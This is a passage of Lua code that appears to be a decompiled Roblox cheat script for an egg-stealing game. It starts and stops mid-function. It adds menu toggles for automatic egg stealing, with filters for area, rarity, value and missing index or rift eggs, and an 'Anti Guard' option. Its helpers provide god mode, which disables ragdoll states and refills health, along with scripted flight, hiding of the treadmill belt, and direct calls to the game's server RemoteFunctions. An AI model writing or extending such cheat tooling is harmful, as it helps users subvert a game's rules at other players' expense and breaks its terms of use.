						flag2 = math.abs(v18.Z) <= n4
					else
						flag2 = flag
					end

					if flag2 then
						return child
					end
					local magnitude = (result.Position - v16).Magnitude

					if magnitude < huge then
						v17 = child
						huge = magnitude
					end
				end
			end

			if v17 and huge <= 60 then
				return v17
			end
			return nil
		end

		tbl4.Belt = function()
			local v15 = tbl4.Plot()
			if not v15 then
				return nil
			end
			local treadmillBottom = v15:FindFirstChild("TreadmillBottom")
			if treadmillBottom and treadmillBottom:IsA("BasePart") then
				return treadmillBottom
			end
			local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
			clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v15.Name)
			local boundingBoxPart

			if clientTreadmillRenders then
				boundingBoxPart = clientTreadmillRenders:FindFirstChild("BoundingBoxPart") or clientTreadmillRenders:IsA("Model") and clientTreadmillRenders.PrimaryPart or clientTreadmillRenders:FindFirstChildWhichIsA("BasePart")
			else
				boundingBoxPart = clientTreadmillRenders
			end

			if boundingBoxPart then
				return boundingBoxPart
			end
			local treadmillUpgrade = v15:FindFirstChild("TreadmillUpgrade")
			return treadmillUpgrade and treadmillUpgrade:FindFirstChildWhichIsA("BasePart") or nil
		end

		tbl4.DistanceTo = function(arg)
			local v15 = tbl4.Root()
			if not v15 or not arg then
				return math.huge
			end
			return (v15.Position - arg).Magnitude
		end

		do
			local tbl10 = {}
			local n3 = 0

			local function fn11()
				local v15 = tbl4.Plot()
				if not v15 then
					return {}
				end
				local tbl11 = {}

				for _, v16 in ipairs({ "TreadmillBottom", "TreadmillUpgrade" }) do
					local v17 = v15:FindFirstChild(v16)

					if v17 then
						if v17:IsA("BasePart") then
							table.insert(tbl11, v17)
						else
							for _, descendant in ipairs(v17:GetDescendants()) do
								if descendant:IsA("BasePart") then
									table.insert(tbl11, descendant)
								end
							end
						end
					end
				end

				local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
				clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v15.Name)

				if clientTreadmillRenders then
					for _, descendant in ipairs(clientTreadmillRenders:GetDescendants()) do
						if descendant:IsA("BasePart") then
							table.insert(tbl11, descendant)
						end
					end
				end

				return tbl11
			end

			local function fn12()
				for _, v15 in ipairs(fn11()) do
					if not tbl10[v15] then
						tbl10[v15] = {
							CFrame = v15.CFrame,
							CanTouch = v15.CanTouch,
							CanCollide = v15.CanCollide,
							Transparency = v15.Transparency,
						}

						pcall(function()
							v15.CanTouch = false
							v15.CanCollide = false
							v15.Transparency = 1
							v15.CFrame = v15.CFrame - Vector3.new(0, 120, 0)
						end)
					end
				end
			end

			local function fn13()
				for k, v15 in pairs(tbl10) do
					if k and k.Parent then
						pcall(function()
							k.CFrame = v15.CFrame
							k.CanTouch = v15.CanTouch
							k.CanCollide = v15.CanCollide
							k.Transparency = v15.Transparency
						end)
					end
				end

				table.clear(tbl10)
			end

			tbl4.HoldBelt = function()
				n3 += 1
				fn12()
			end

			tbl4.ReleaseBelt = function()
				n3 = math.max(0, n3 - 1)

				if n3 == 0 then
					fn13()
				end
			end

			tbl4.BeltHeld = function()
				return n3 > 0
			end

			tbl4.RefreshBeltHide = function()
				if n3 > 0 then
					fn12()
				end
			end

			fn4(function()
				n3 = 0
				fn13()
			end)

			tbl4.LeaveBelt = function()
				local rfTreadmillAskDoff = networking:FindFirstChild("RF/Treadmill/AskDoff")

				if rfTreadmillAskDoff and rfTreadmillAskDoff:IsA("RemoteFunction") then
					pcall(rfTreadmillAskDoff.InvokeServer, rfTreadmillAskDoff)
				end
			end

			tbl4.Treadmill = { Riding = false }

			tbl4.ResetBelt = function()
				n3 = 0
				fn13()
			end

			tbl4.OnBelt = function()
				local v15 = tbl4.Belt()
				if not v15 or tbl10[v15] then
					return false
				end
				local v16 = tbl4.Root()
				if not v16 then
					return false
				end
				local v17 = v15.CFrame:PointToObjectSpace(v16.Position)
				local n4 = v15.Size.X / 2 + 2
				local flag = math.abs(v17.X) <= n4

				if flag then
					local n5 = v15.Size.Z / 2 + 2
					flag = math.abs(v17.Z) <= n5
				end

				return flag and v17.Y >= -2 and v17.Y <= v15.Size.Y / 2 + 8
			end
		end

		tbl4.ExitBelt = function()
			tbl4.Treadmill.Riding = false
			tbl4.LeaveBelt()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.Jump = true
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end)
			end

			task.wait(0.35)
		end

		tbl4.Flying = false
		tbl4.Driving = 0

		tbl4.BeginFlight = function()
			tbl4.Flying = true
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.PlatformStand = true

				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
				end)
			end

			return tbl4.Root() ~= nil
		end

		tbl4.SetFlightVelocity = function(assemblyLinearVelocity)
			local v15 = tbl4.Root()

			if v15 then
				v15.AssemblyLinearVelocity = assemblyLinearVelocity
				v15.AssemblyAngularVelocity = Vector3.zero
			end
		end

		tbl4.EndFlight = function()
			tbl4.Flying = false
			local v15 = tbl4.Root()

			if v15 then
				pcall(function()
					v15.AssemblyLinearVelocity = Vector3.zero
					v15.AssemblyAngularVelocity = Vector3.zero
				end)
			end

			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")

			if character then
				character.PlatformStand = false
			end
		end

		do
			local tbl10 = {
				Enum.HumanoidStateType.FallingDown,
				Enum.HumanoidStateType.Ragdoll,
				Enum.HumanoidStateType.Physics,
				Enum.HumanoidStateType.Seated,
				Enum.HumanoidStateType.PlatformStanding,
			}

			local tbl11 = {}
			local flag = false

			tbl4.GodMode = function(arg)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not character or not humanoid then
					return
				end

				if arg then
					flag = true

					for _, v15 in ipairs(tbl10) do
						pcall(function()
							humanoid:SetStateEnabled(v15, false)
						end)
					end

					pcall(function()
						humanoid.BreakJointsOnDeath = false
					end)

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") and tbl11[descendant] == nil then
							tbl11[descendant] = descendant.CanCollide

							pcall(function()
								descendant.CanCollide = false
							end)
						end
					end
				elseif flag then
					flag = false

					for _, v15 in ipairs(tbl10) do
						pcall(function()
							humanoid:SetStateEnabled(v15, true)
						end)
					end

					for k, v15 in pairs(tbl11) do
						if k and k.Parent then
							pcall(function()
								k.CanCollide = v15
							end)
						end
					end

					table.clear(tbl11)
				end
			end
		end

		tbl4.GodTick = function()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.Health < humanoid.MaxHealth then
				pcall(function()
					humanoid.Health = humanoid.MaxHealth
				end)
			end
		end

		tbl4.StopWalking = function()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoidRootPart then
				pcall(function()
					humanoid:MoveTo(humanoidRootPart.Position)
					humanoid:Move(Vector3.zero, false)
				end)
			end
		end

		local function fn11(arg, arg2, arg3, arg4)
			local n3 = tonumber(arg2) or 6
			local n4 = tonumber(arg3) or 10
			local n5 = 0
			local flag = nil
			local n6 = 0
			local n7 = 0

			while n5 < n4 do
				if type(arg4) == "function" and arg4() then
					tbl4.StopWalking()
					return false
				end
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				character = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoidRootPart or not character or character.Health <= 0 then
					return false
				end

				if (humanoidRootPart.Position - arg).Magnitude <= n3 then
					tbl4.StopWalking()
					return true
				end
				flag = flag and (humanoidRootPart.Position - flag).Magnitude < 1

				if flag then
					n6 += 0.2
				else
					n6 = 0
				end

				flag = humanoidRootPart.Position
				n7 = math.max(0, n7 - 0.2)

				if n6 >= 0.8 and n7 <= 0 then
					tbl4.LeaveBelt()

					pcall(function()
						character.Jump = true
					end)

					n6 = 0
					n7 = 1.5
				end

				character:MoveTo(arg)
				n5 += task.wait(0.2)
			end

			tbl4.StopWalking()
			return tbl4.DistanceTo(arg) <= n3
		end

		tbl4.WalkTo = function(arg, arg2, arg3, arg4)
			tbl4.Driving = tbl4.Driving + 1
			local ok, result = pcall(fn11, arg, arg2, arg3, arg4)
			tbl4.Driving = math.max(0, tbl4.Driving - 1)
			return ok and result == true
		end

		local tbl10 = {
			Boss = "Fractured",
			GreatBloom = "Spirit Bloom",
			Sakura = "Bloom",
			Monstrous = "Parasite",
		}

		task.spawn(function()
			local mutations = tbl.Mutations

			local ok, result = pcall(function()
				return mutations.All()
			end)

			if ok and type(result) == "table" then
				for k, v15 in pairs(result) do
					local flag = type(v15) == "table"
					local id

					if flag then
						id = v15.Id or k
					else
						id = flag
					end

					id = id or nil
					local label = type(v15) == "table" and v15.Label or nil

					if id ~= nil and type(label) == "string" and label ~= "" then
						tbl10[tostring(id)] = label
					end
				end
			end
		end)

		fn7 = function(arg)
			return tbl10[tostring(arg)] or tostring(arg)
		end

		local tbl11, tbl12, n3, tbl13, tbl14, tbl15, tbl16, flag, tbl17, n4
		local v15, n5, fn12

		do
			local tbl18 = {
				"Forest",
				"Desert",
				"Snow",
				"Lake",
				"Jungle",
				"Volcano",
				"Prehistoric",
				"Cosmic",
				"Abyss Ocean",
				"Cherry Blossom",
				"Light Dark",
				"Titan Temple",
			}

			local tbl19 = {}

			for _, v16 in ipairs(tbl18) do
				tbl19[v16] = true
			end

			task.spawn(function()
				local eggState = tbl.EggState

				local ok, result = pcall(function()
					return eggState.ReadFieldEggs()
				end)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					for _, record in pairs(result.Records) do
						local areaId = type(record) == "table" and record.AreaId or nil

						if type(areaId) == "string" and not tbl19[areaId] then
							tbl19[areaId] = true
							table.insert(tbl18, areaId)
						end
					end
				end
			end)

			tbl7 = { "Any" }
			tbl8 = { Any = 0 }
			local tbl20 = {}
			local directory = tbl.Assets and tbl.Assets.Directory

			if type(directory) == "table" then
				for _, v16 in pairs(directory) do
					local rarity = type(v16) == "table" and v16.Rarity or nil
					local flag2 = type(rarity) == "table"

					if flag2 then
						flag2 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag2 = flag2 or nil

					if flag2 then
						local str = tbl20[flag2]

						if not str then
							str = tostring(rarity.DisplayName or rarity._id or flag2)
						end

						tbl20[flag2] = str
					end
				end
			end

			if next(tbl20) == nil then
				tbl20 = {
					"Common",
					"Uncommon",
					"Rare",
					"Epic",
					"Legendary",
					"Mythic",
					"Cosmic",
					"Secret",
					"Eternal",
					"Divine",
				}
			end

			local tbl21 = {}

			for k in pairs(tbl20) do
				table.insert(tbl21, k)
			end

			table.sort(tbl21)

			for _, v16 in ipairs(tbl21) do
				table.insert(tbl7, tbl20[v16])
				tbl8[tbl20[v16]] = v16
			end

			tbl11 = { "Best Rarity", "Biggest Weight", "Best Mutation", "Highest Value", "Lowest Value" }
			tbl12 = {}
			n3 = 0
			tbl13 = {}
			tbl14 = {}
			tbl15 = {}
			tbl16 = {}
			tbl4.Steal.RiftPriority = false
			tbl4.Steal.RiftNeeds = {}
			flag = false
			tbl17 = {}
			n4 = 0
			v15 = tbl11[4]
			n = 400
			n5 = 27.4
			n2 = 400
			fn12 = nil

			v4 = v8:CreateToggle({
				Name = "Auto Steal",
				Default = false,
				Callback = function()
					if fn12 then
						fn12()
					end
				end,
			})

			for _, v16 in ipairs(tbl18) do
				tbl12[v16] = true
			end

			fn6(v8:CreateMultiDropdown({
				Name = "Target Areas",
				Options = tbl18,
				Default = tbl18,
				Callback = function(arg)
					local tbl22 = {}

					if type(arg) == "table" then
						for k, v16 in pairs(arg) do
							if v16 == true and type(k) == "string" then
								tbl22[k] = true
							elseif type(v16) == "string" then
								tbl22[v16] = true
							end
						end
					end

					if next(tbl22) == nil then
						for _, v16 in ipairs(tbl18) do
							tbl22[v16] = true
						end
					end

					tbl12 = tbl22
				end,
			}))
		end

		v8:CreateDropdown({
			Name = "Min Rarity",
			Note = "Steal eggs of the chosen rarity and every rarity above it",
			Options = tbl7,
			Default = tbl7[1],
			Callback = function(arg)
				n3 = tbl8[arg] or 0
			end,
		})

		fn5(v8, {
			Name = "Min Steal Value",
			Note = "Skip eggs worth less than this. Drag or type 250k, 50m, 1.5b",
			Legacy = "Min Value To Steal",
			SectionName = "Auto Steal",
			OnRaw = function(arg)
				n4 = arg
			end,
		})

		do
			local tbl18 = {}
			local tbl19 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl20 = {}

			if type(directory) == "table" then
				for k, v16 in pairs(directory) do
					local rarity = type(v16) == "table" and v16.Rarity or nil
					local flag2 = type(rarity) == "table"

					if flag2 then
						flag2 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local v17 = flag2 or nil

					if v17 then
						table.insert(tbl20, {
							Category = tostring(k),
							Name = tostring(v16.DisplayName or k),
							Rarity = v17,
							RarityName = tostring(rarity.DisplayName or rarity._id or v17),
						})
					end
				end
			end

			table.sort(tbl20, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v16 in ipairs(tbl20) do
				local str = string.format("%s [%s]", v16.Name, v16.RarityName)

				if tbl19[str] then
					str = string.format("%s [%s] (%s)", v16.Name, v16.RarityName, v16.Category)
				end

				table.insert(tbl18, str)
				tbl19[str] = v16.Category
			end

			fn6(v8:CreateMultiDropdown({
				Name = "Target Specific Eggs",
				Note = "Only steal these eggs (empty = all)",
				Options = tbl18,
				Default = {},
				Callback = function(arg)
					local tbl21 = {}

					if type(arg) == "table" then
						for k, v16 in pairs(arg) do
							k = v16 == true and type(k) == "string" and k or type(v16) == "string" and v16
							local v17 = k or nil

							if v17 and tbl19[v17] then
								tbl21[tbl19[v17]] = true
							end
						end
					end

					tbl13 = tbl21
				end,
			}))
		end

		do
			local n6 = 30
			local v16 = nil
			local flag2 = false
			local n7 = 0

			local function fn13()
				local tbl18 = {}
				local save2 = tbl.Save

				if type(save2) == "table" and type(save2.Get) == "function" then
					local ok, result = pcall(save2.Get)

					if ok and type(result) == "table" then
						local v17 = pairs
						local inventory = result.Inventory or {}

						for _, v18 in v17(inventory) do
							if type(v18) == "table" and v18.Category ~= nil then
								tbl18[tostring(v18.Category)] = true
							end
						end

						local v18 = pairs
						local eggInventory = result.EggInventory or {}

						for _, v19 in v18(eggInventory) do
							if type(v19) == "table" and v19.AssetCategory ~= nil then
								tbl18[tostring(v19.AssetCategory)] = true
							end
						end
					end
				end

				return tbl18
			end

			local function fn14()
				local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")
				if not rfRiftAskState or not rfRiftAskState:IsA("RemoteFunction") then
					return
				end
				local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)
				if not ok or type(result) ~= "table" or type(result.Requirements) ~= "table" then
					return
				end
				local v17 = fn13()
				local riftNeeds = {}

				for _, requirement in pairs(result.Requirements) do
					if not v17[tostring(requirement)] then
						riftNeeds[tostring(requirement)] = true
					end
				end

				tbl4.Steal.RiftNeeds = riftNeeds
			end

			tbl3.Add(function()
				if not tbl4.Steal.RiftPriority or flag2 or os.clock() < n7 then
					return false
				end
				flag2 = true
				n7 = os.clock() + n6

				task.spawn(function()
					pcall(fn14)
					flag2 = false
				end)

				return false
			end)

			local function fn15()
				local riftNeeds = tbl4.Steal.RiftNeeds
				if not tbl4.Steal.RiftPriority or next(riftNeeds) == nil then
					return
				end
				local v17 = fn13()
				local flag3 = false

				for k in pairs(riftNeeds) do
					if v17[k] then
						riftNeeds[k] = nil
						flag3 = true
					end
				end

				if flag3 then
					tbl3.Wake()
				end
			end

			local save2 = tbl.Save

			if type(save2) == "table" and type(save2.FieldSignal) == "function" then
				for _, v17 in ipairs({ "EggInventory", "Inventory" }) do
					local ok, result = pcall(save2.FieldSignal, v17)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							task.defer(fn15)
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end

			v16 = v8:CreateToggle({
				Name = "Steal Missing Rift Eggs",
				Note = "Steal eggs the Rift recipe needs, after your filtered targets",
				Default = false,
				Callback = function()
					tbl4.Steal.RiftPriority = tbl4.Toggle(v16, false) == true
					n7 = 0

					if not tbl4.Steal.RiftPriority then
						tbl4.Steal.RiftNeeds = {}
					end

					tbl3.Wake()
				end,
			})
		end

		do
			local n6 = 5
			local n7 = 5
			local n8 = 60
			local v16 = nil
			local n9 = 0
			local n10 = 0
			local flag2 = false
			local tbl18 = {}

			local function fn13()
				local save2 = tbl.Save

				if type(save2) == "table" and type(save2.Get) == "function" then
					local ok, result = pcall(save2.Get)
					if ok and type(result) == "table" then
						return result
					end
				end

				return nil
			end

			local function fn14()
				local v17 = fn13()
				local directory = tbl.Areas and tbl.Areas.Directory
				local directory2 = tbl.Assets and tbl.Assets.Directory
				if not v17 or type(directory) ~= "table" or type(directory2) ~= "table" then
					return
				end
				local index = type(v17.Index) == "table" and v17.Index or {}
				local tbl19 = {}
				local v18 = pairs
				local inventory = v17.Inventory or {}

				for _, v19 in v18(inventory) do
					if type(v19) == "table" and v19.Category ~= nil then
						tbl19[tostring(v19.Category)] = true
					end
				end

				local v19 = pairs
				local eggInventory = v17.EggInventory or {}

				for _, v20 in v19(eggInventory) do
					if type(v20) == "table" and v20.AssetCategory ~= nil then
						tbl19[tostring(v20.AssetCategory)] = true
					end
				end

				local tbl20 = {}

				for _, v20 in pairs(directory) do
					local flag3 = type(v20) == "table" and type(v20.Rarity) == "table"

					if flag3 then
						flag3 = tonumber(v20.Rarity.RarityNumber or v20.Rarity.Rank)
					end

					flag3 = flag3 or 0
					local v21 = pairs
					local dropTable = type(v20) == "table" and v20.DropTable or {}

					for _, v22 in v21(dropTable) do
						local flag4 = type(v22) == "table" and v22[1] or nil
						local n11 = type(v22) == "table" and tonumber(v22[2]) or 0
						local flag5 = flag4 ~= nil and directory2[flag4] or nil

						if type(flag5) == "table" and n11 > 0 and flag5.DontRoll ~= true then
							local str = tostring(flag4)

							if index[flag4] ~= true and not tbl19[str] and (tbl20[str] == nil or flag3 > tbl20[str]) then
								tbl20[str] = flag3
							end
						end
					end
				end

				tbl17 = tbl20
			end

			local function fn15(arg, ...)
				local v17 = networking:FindFirstChild(arg)
				if not v17 or not v17:IsA("RemoteFunction") then
					return false
				end
				local ok, result = pcall(v17.InvokeServer, v17, ...)
				return ok and result ~= false
			end

			local function fn16(arg, arg2)
				local tbl19 = {}
				if type(arg) ~= "table" then
					return tbl19
				end

				for _, v17 in ipairs(arg2) do
					local flag3 = arg

					for _, v18 in ipairs(v17) do
						flag3 = type(flag3) == "table" and flag3[v18] or nil
					end

					local v18 = ipairs
					flag3 = type(flag3) == "table" and flag3 or {}

					for _, v19 in v18(flag3) do
						if type(v19) == "table" and v19.AssetId ~= nil then
							table.insert(tbl19, v19.AssetId)
						end
					end
				end

				return tbl19
			end

			local tbl19 = {
				{
					Id = "LimitedEgg",
					Gear = "GravityDisruptor",
					Module = "LimitedEgg",
					Lists = { { "Entries" }, { "MechaReroll", "Entries" } },
				},
				{
					Id = "BrainrotEgg",
					Gear = "BeeLauncher",
					Module = "BrainrotEgg",
					Lists = { { "Entries" } },
				},
				{
					Id = "MonsterEgg",
					Gear = "BeeLauncher",
					Module = "MonsterEgg",
					Lists = { { "Entries" }, { "MechaEntries" } },
				},
			}

			local function fn17()
				local v17 = fn13()
				if not v17 then
					return
				end
				local index = type(v17.Index) == "table" and v17.Index or {}
				local indexClaimedCategories = type(v17.IndexClaimedCategories) == "table" and v17.IndexClaimedCategories or {}

				for k, v18 in pairs(index) do
					if v18 == true and indexClaimedCategories[k] ~= true then
						fn15("RF/Codex/AskRedeemAll")
						break
					end
				end

				local gearInventory = type(v17.GearInventory) == "table" and v17.GearInventory or {}

				for _, v18 in ipairs(tbl19) do
					local flag3 = (tonumber(gearInventory[v18.Gear]) or 0) <= 0
					local flag4

					if flag3 then
						flag4 = os.clock() >= (tbl18[v18.Id] or 0)
					else
						flag4 = flag3
					end

					if flag4 then
						local v19 = fn16(tbl[v18.Module], v18.Lists)
						local flag5 = #v19 > 0

						for _, v20 in ipairs(v19) do
							if index[v20] ~= true then
								flag5 = false
								break
							end
						end

						if flag5 then
							tbl18[v18.Id] = os.clock() + n8
							fn15("RF/Codex/AskRedeemLimitedEgg", v18.Id)
						end
					end
				end
			end

			tbl3.Add(function()
				local now = os.clock()

				if flag and now >= n9 then
					n9 = now + n6
					pcall(fn14)
				end

				if not flag2 and now >= n10 and tbl4.Toggle(tbl4.IndexClaimHandle, false) then
					flag2 = true
					n10 = now + n7

					task.spawn(function()
						pcall(fn17)
						flag2 = false
					end)
				end

				return false
			end)

			v16 = v8:CreateToggle({
				Name = "Steal Missing Index Eggs",
				Note = "Also steal eggs missing from your index, highest area first",
				Default = false,
				Callback = function()
					flag = tbl4.Toggle(v16, false) == true
					n9 = 0

					if not flag then
						tbl17 = {}
					end

					tbl3.Wake()
				end,
			})

			tbl4.IndexClaimRestart = function()
				n10 = 0
				tbl3.Wake()
			end
		end

		v8:CreateDropdown({
			Name = "Steal Priority",
			Options = tbl11,
			Default = tbl11[4],
			Callback = function(arg)
				if table.find(tbl11, arg) then
					v15 = arg
				end
			end,
		})

		v5 = v8:CreateSlider({
			Name = "Tween Speed",
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				local n6 = math.clamp(tonumber(arg) or 400, 100, 1000)
				n = n6
				n2 = n6
			end,
		})

		tbl4.AntiGuard.PanelHandle = v8:CreateToggle({
			Name = "Anti Guard V1",
			Note = "Not recommended to use with Auto Steal",
			Default = false,
			Callback = function(panelShown)
				if type(panelShown) ~= "boolean" then
					panelShown = tbl4.Toggle(tbl4.AntiGuard.PanelHandle, false)
				end

				tbl4.AntiGuard.PanelShown = panelShown

				if tbl4.AntiGuard.ShowPanel then
					pcall(tbl4.AntiGuard.ShowPanel, panelShown)
				end
			end,
		})

		local v16
		v16 = nil
		local v17
		v17 = nil
		local v18
		v18 = nil
		local str
		str = "None"
		local str2
		str2 = "Idle"
		local flag2
		flag2 = false
		local n6
		n6 = 0
		local tbl18
		tbl18 = {}
		local n7
		n7 = 20
		local uid
		uid = nil
		local fn13

		fn13 = function(arg)
			return arg ~= n6 or not tbl4.Toggle(v16, false)
		end

		local fn14

		do
			local tbl19 = {}

			local function fn15(arg)
				if type(arg) ~= "number" or tbl19[arg] then
					return
				end
				tbl19[arg] = true

				task.delay(math.max(0, arg - workspace:GetServerTimeNow()) + 0.05, function()
					tbl19[arg] = nil
					tbl3.Wake()
				end)
			end

			local n8 = 0

			fn14 = function()
				local areaEggCycle = tbl.AreaEggCycle
				if type(areaEggCycle) ~= "table" then
					return nil
				end

				local ok, result, result2, result3, result4 = pcall(function()
					local serverTimeNow = workspace:GetServerTimeNow()
					local nextResetTime = areaEggCycle.NextResetTime
					return serverTimeNow, areaEggCycle.IsNightPhase(serverTimeNow), areaEggCycle.NextNightTime(serverTimeNow), nextResetTime(serverTimeNow)
				end)

				if not ok or type(result4) ~= "number" then
					return nil
				end

				if result2 == true then
					n8 = result4 + tbl4.WallOpenDelay()
					fn15(n8)
					return n8, "night", result
				end

				if tbl4.WallSealed() then
					fn15(result + 0.3)
					return math.max(n8, result), "wall", result
				end

				if type(result3) == "number" and result3 > result then
					fn15(result3)
				end

				return nil
			end
		end

		do
			local areaEggResetWall = tbl.AreaEggResetWall
			local changed = type(areaEggResetWall) == "table" and areaEggResetWall.Changed or nil

			if changed and type(changed.Connect) == "function" then
				local ok, result = pcall(function()
					return changed:Connect(function()
						tbl3.Wake()
					end)
				end)

				if ok and result then
					fn4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		local n8
		n8 = 8
		local v19
		v19 = nil
		local n9
		n9 = 0
		local fn15, fn16, fn17

		local function fn18(arg)
			local tbl19 = {}
			local str3 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
			local eggState = tbl.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						for _, record in pairs(result.Records) do
							local flag3 = type(record) == "table" and type(record.Uid) == "string"

							if flag3 then
								flag3 = not (arg and string.sub(record.Uid, 1, #str3) == str3)
							end

							if flag3 then
								tbl19[record.Uid] = true
							end
						end
					end
				end)
			end

			return tbl19
		end

		fn15 = function()
			if v19 == nil then
				return false
			end

			if tbl4.IsNight() then
				return true
			end

			if n9 == math.huge then
				n9 = os.clock() + n8
			end

			return false
		end

		fn16 = function()
			if v19 and n9 == math.huge then
				return
			end
			v19 = fn18(true)
			n9 = math.huge
			table.clear(tbl14)
			table.clear(tbl16)
			table.clear(tbl15)
			table.clear(tbl18)
			uid = nil
		end

		fn17 = function()
			if not v19 then
				return false
			end

			if os.clock() >= n9 then
				v19 = nil
				return false
			end
			local v20 = fn18()
			if next(v20) == nil then
				return true
			end
			local flag3 = false
			local flag4 = false

			for k in pairs(v20) do
				if v19[k] then
					flag3 = true
				else
					flag4 = true
				end
			end

			if not flag3 then
				v19 = nil
				return false
			end
			return not flag4
		end

		local fn19

		do
			local function fn20(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
				local rarity = type(flag3) == "table" and type(flag3.Rarity) == "table" and flag3.Rarity or nil
				local tbl19 = {}

				if rarity then
					rarity = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				tbl19.RarityNumber = rarity or 0
				tbl19.EarningRate = type(flag3) == "table" and tonumber(flag3.EarningRate) or 0
				return tbl19
			end

			local function fn21(arg)
				local mutations = tbl.Mutations

				if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
					local ok, result = pcall(mutations.EarningsFor, type(arg) == "table" and arg or {})
					if ok and type(result) == "number" then
						return result
					end
				end

				return 1
			end

			local function fn22(arg, arg2)
				local eggRecords = tbl.EggRecords

				if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
					if ok and type(result) == "number" then
						return result
					end
				end

				return 0
			end

			fn19 = function(arg, arg2)
				local records = nil
				local eggState = tbl.EggState

				if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
					task.spawn(function()
						local ok, result = pcall(eggState.ReadFieldEggs)

						if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
							records = result.Records
						end
					end)
				end

				if not records then
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
					if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
						return {}
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					records = ok and type(result) == "table" and result.Records or nil
				end

				if type(records) ~= "table" then
					return {}
				end
				local tbl19 = {}
				local tbl20 = {}

				for _, record in pairs(records) do
					local uid2 = type(record) == "table" and record.Uid or nil

					if uid2 and record.State ~= "Claimed" then
						tbl20[uid2] = true
					end

					local flag3 = record.State == "Carried" and arg2 == true and arg ~= true and not (tbl4.Steal.Carrying and uid2 == tbl4.Steal.CarryUid)
					local flag4

					if uid2 then
						flag4 = record.State == "Slot" or record.State == "Dropped" or flag3
					else
						flag4 = uid2
					end

					local v20 = uid2 and tbl14[uid2] or nil
					local flag5 = uid2 and tbl15[uid2] == true or false
					local flag6 = arg ~= true and flag and uid2 and tbl17[tostring(record.AssetCategory)] or nil
					local flag7 = arg ~= true and tbl4.Steal.RiftPriority == true and uid2 ~= nil and tbl4.Steal.RiftNeeds[tostring(record.AssetCategory)] == true
					local flag8 = arg == true or v20 ~= nil or flag5 or flag7 or flag6 ~= nil or tbl12[tostring(record.AreaId)] == true
					local flag9 = arg ~= true and v20 == nil and tbl16[uid2] == true
					local flag10 = v19 ~= nil and v19[uid2] == true
					flag4 = flag4 and typeof(record.BottomCFrame) == "CFrame"

					if flag4 then
						flag4 = (tbl18[uid2] or 0) <= os.clock()
					end

					if flag4 and flag8 and not flag9 and not flag10 then
						local v21 = fn20(record.AssetCategory)
						local str3 = tostring(record.AssetCategory)
						local flag11 = v21.RarityNumber >= n3
						local flag12 = next(tbl13) == nil or tbl13[str3] == true
						local n10 = tonumber(record.AssetScale) or 1
						local v22 = fn21(record.Mutations)
						local n11 = n10 > 5 and (n10 / 5) ^ 1.2 * 19.637875755794113 or n10 ^ 1.85
						local flag13 = n4 <= 0 or v21.EarningRate * n11 * v22 >= n4
						flag13 = flag11 and flag12 and flag13
						local flag14 = flag7 and not flag13 and not flag5 and v20 == nil and flag6 == nil

						if arg == true or v20 or flag5 or flag7 or flag6 ~= nil or flag13 then
							table.insert(tbl19, {
								Uid = uid2,
								Category = str3,
								Scale = n10,
								State = record.State,
								Rarity = v21.RarityNumber,
								Weight = fn22(record.AssetCategory, n10),
								Mutation = v22,
								Value = v21.EarningRate * n11 * v22,
								CFrame = record.BottomCFrame,
								AreaId = tostring(record.AreaId),
								Rift = arg ~= true and flag7,
								RiftOnly = arg ~= true and flag14,
								Index = flag6,
								Forced = arg ~= true and v20 and v20.At or nil,
